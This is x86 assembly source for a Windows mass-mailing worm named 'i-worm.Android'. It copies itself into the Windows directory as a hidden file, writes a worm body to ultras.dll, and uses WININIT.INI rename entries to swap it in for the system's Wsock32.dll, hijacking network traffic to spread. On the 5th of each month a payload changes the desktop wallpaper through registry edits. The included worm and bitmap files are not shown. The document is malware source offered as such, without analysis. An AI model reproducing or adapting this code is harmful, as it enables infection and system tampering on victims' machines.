; i-worm.Android

.386
.model flat, stdcall
locals
callW   macro   x
extrn   x:PROC
call    x
endm
.data
subkey                  db      "Control Panel\Desktop",0
phkey                   dd      ?
twp_data                db      "1",0
wps_data                db      "0",0
twp_string              db      "TileWallpaper",0
wps_string              db      "WallpaperStyle",0
wallpaper               db      "ANDROID.BMP",0
bmp_handle              dd      ?
num_bytes_written       dd      ?
num_bytes_written2 	dd 	?
rename		 	db 	"Rename",0
cur_name 		db 	260 dup (0)
szUltras 		db 	260 dup (0)
szAndroid 		db 	260 dup (0)
szWinsock32 		db 	260 dup (0)
szWinsock33 		db 	260 dup (0)
szWinInitFile 		db 	260 dup (0)
kernel_old 		db 	"\Wsock32.dll",0 
kernel_new 		db 	"\Wsock33.dll",0 
wininit 		db 	"\\WININIT.INI",0
filename 		db 	"\Android.dll",0
filename2 		db 	"\ultras.dll",0
FileHandle 		dd 	0
filehandle 		dd 	0

GENERIC_READ            equ     80000000h
GENERIC_WRITE           equ     40000000h
GENERIC_READ_WRITE      equ     GENERIC_READ or GENERIC_WRITE
OPEN_EXISTING           equ     00000003h
FILE_ATTRIBUTE_NORMAL   equ     00000080h
FILE_SHARE_READ         equ     00000001h

HKEY_CURRENT_USER       equ     80000001h
KEY_SET_VALUE           equ     00000002h
REG_SZ                  equ     00000001h
SPI_SETDESKWALLPAPER    equ     00000020
CREATE_ALWAYS           equ     00000002h
MB_ICONEXCLAMATION      equ     00000030h

bmp_filesize 		equ offset bmp_data_end - offset bmp_data_start
worm_size    		equ z2 - z0x

SystemTime:
  wYear dw 0
  wMonth dw 0
  wDayOfWeek dw 0 
  wDay dw 0
  wHour dw 0 
  wMinute dw 0 
  wSecond dw 0
  wMilliseconds dw 0
.code

start:
	push 	0
	callW 	GetModuleHandleA

	push 	260
	push 	offset cur_name
	push 	eax
	callW 	GetModuleFileNameA

	push 	260
	push 	offset szAndroid
	callW 	GetWindowsDirectoryA

	push 	offset filename
	push 	offset szAndroid
	callW 	lstrcat

	push 	0
	push 	offset szAndroid
	push 	offset cur_name
	callW 	CopyFileA

	push 	00000001h OR 00000002h	; New file attributes to set
	push 	offset filename
	callW 	SetFileAttributesA

	push 	260                     ; Get System directory
	push 	offset szUltras
	callW 	GetWindowsDirectoryA

	push 	offset filename2
	push 	offset szUltras
	callW 	lstrcat

Wininit:
	push 	260                     ; Get System directory
	push 	offset szWinsock32
	callW 	GetSystemDirectoryA

	push 	260                     ; Again!!!
	push 	offset szWinsock33
	callW 	GetSystemDirectoryA

	push 	offset kernel_old       ; Concatenate "Wsock32.dll"
	push 	offset szWinsock32
	callW 	lstrcat

	push 	offset kernel_new       ; Concatenate "Wsock33.dll"
	push 	offset szWinsock33
	callW 	lstrcat

	push 	260                     ; Get Windows directory
	push 	offset szWinInitFile
	callW 	GetWindowsDirectoryA

	push 	offset wininit          ; Concatenate wininit.ini filename
	push 	offset szWinInitFile
	callW 	lstrcat

	push 	offset szWinInitFile	; Write profiles
	push 	offset szWinsock32
	push 	offset szWinsock33
	push 	offset rename
	callW 	WritePrivateProfileStringA

	push 	offset szWinInitFile
	push 	offset szUltras     
	push 	offset szWinsock32
	push 	offset rename
	callW 	WritePrivateProfileStringA

	push 	00000000h               ; Handle to template file (?)
	push 	FILE_ATTRIBUTE_NORMAL	; File attributes
        push 	CREATE_ALWAYS           ; Create new file
        push    00000000h               ; Security attributes
        push    FILE_SHARE_READ         ; Allow read access to others
        push    GENERIC_WRITE           ; Open for writing only
	push 	offset szUltras		; windir/ultras.dll
	callW 	CreateFileA
	mov 	ebx, eax
	push    00000000h               ; Overlapping (not supported)
	push 	offset num_bytes_written2
	push 	worm_size		; No. of bytes to write
	push 	offset z0x
	push 	ebx			; windir/ultras.dll
	callW 	WriteFile
	push 	ebx
	callW 	CloseHandle		; Close file
	call 	payload			; payload!!!
	ret

payload:
	push    offset SystemTime       ; Pointer to structure
	callW   GetSystemTime           ; Get the system time data.

	cmp     byte ptr [wDay],5
	jne     Exit

	push    00000000h               ; Handle to template file (?)
        push    FILE_ATTRIBUTE_NORMAL   ; File attributes
        push    CREATE_ALWAYS           ; Create new file
        push    00000000h               ; Security attributes
        push    FILE_SHARE_READ         ; Allow read access to others
        push    GENERIC_WRITE           ; Open for writing only
        push    offset wallpaper        ; Adjust with delta
        callW   CreateFileA
        mov     [bmp_handle],eax    	; Save opened file's handle

        push    00000000h               ; Overlapping (not supported)
        push    offset num_bytes_written
        push    bmp_filesize            ; No. of bytes to write
        push    offset bmp_data_start 
        push    [bmp_handle]        	; Handle of opened file
        callW   WriteFile

        push    [bmp_handle]        	; Handle of opened file
        callW   CloseHandle

        push    offset phkey
        push    KEY_SET_VALUE           ; Security access mask 
        push    00000000h               ; Reserved (?)
        push    offset subkey
        push    HKEY_CURRENT_USER
        callW   RegOpenKeyExA		; Opens an existing registry key
                                        
        push    00000002h
        push    offset twp_data
        push    REG_SZ                  ; Flag for value data
        push    00000000h               ; Reserved (?)
        push    offset twp_string
        push    [phkey]             	; Handle of key to set value for
        callW   RegSetValueExA		; Assigns a value to a key

        push    00000002h               ; Size of value data
        push    offset wps_data
        push    REG_SZ                  ; Flag for value data
        push    00000000h               ; Reserved (?)
        push    offset wps_string
        push    [phkey]             	; Handle of key to set value for
        callW   RegSetValueExA		; Assigns a value to a key
                                        
        push    00000000h		; User profile update flag
        push    offset wallpaper	; ASCIIZ filename of .BMP file
        push    00000000h		; Reserved
        push    SPI_SETDESKWALLPAPER	; System parameter to set
        callW   SystemParametersInfoA	; Address of API to call

        push 	0
        callW   RegCloseKey		; Closes an open registry key
Exit:
        push 	0
	callW   ExitProcess		; Exit

	db 	"ANDROiD"

include worm.inc			; worm
include bmp.inc				; matrix.bmp
end start
